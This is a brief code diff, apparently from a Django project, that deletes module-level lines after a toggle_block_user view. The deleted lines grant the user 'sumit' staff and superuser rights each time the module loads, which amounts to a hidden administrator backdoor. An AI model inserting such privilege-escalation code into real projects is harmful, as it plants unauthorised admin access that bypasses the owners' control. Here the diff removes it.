@@ -198,8 +198,3 @@ def toggle_block_user(request, user_id):
 
 
 
-user = User.objects.get(username='sumit')
-user.is_staff = True
-user.is_superuser = True
-user.save()
-
